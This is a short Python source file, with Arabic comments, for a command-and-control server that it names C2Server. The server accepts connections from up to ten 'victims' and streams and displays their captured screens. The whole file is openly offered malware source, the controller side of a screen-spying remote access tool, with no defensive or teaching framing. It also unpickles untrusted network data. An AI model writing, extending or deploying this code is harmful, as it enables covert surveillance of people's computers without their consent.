import socket
import threading
import pickle
import struct
import cv2

class C2Server:
    def __init__(self, host='0.0.0.0', port=9999):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((host, port))
        self.server.listen(10) # استقبال حتى 10 اتصالات متزامنة
        print(f"[*] العقل المدبر جاهز! ينتظر الضحايا على المنفذ {port}")

    def handle_victim(self, conn, addr):
        """إدارة اتصال كل ضحية على حدة"""
        print(f"[+] ضحية جديدة متصلة: {addr}")
        data = b""
        payload_size = struct.calcsize(">L")
        
        try:
            while True:
                while len(data) < payload_size:
                    data += conn.recv(4096)
                
                packed_msg_size = data[:payload_size]
                data = data[payload_size:]
                msg_size = struct.unpack(">L", packed_msg_size)[0]
                
                while len(data) < msg_size:
                    data += conn.recv(4096)
                
                frame_data = data[:msg_size]
                data = data[msg_size:]
                
                # فك التشفير وعرض الشاشة
                frame = pickle.loads(frame_data)
                cv2.imshow(f"Victim: {addr}", frame)
                if cv2.waitKey(1) == 27: break
        except Exception as e:
            print(f"[-] فقدنا الاتصال بـ {addr}: {e}")
        finally:
            conn.close()

    def run(self):
        while True:
            conn, addr = self.server.accept()
            # فتح خيط (Thread) منفصل لكل ضحية لضمان عدم توقف النظام
            threading.Thread(target=self.handle_victim, args=(conn, addr)).start()

if __name__ == "__main__":
    server = C2Server()
    server.run()
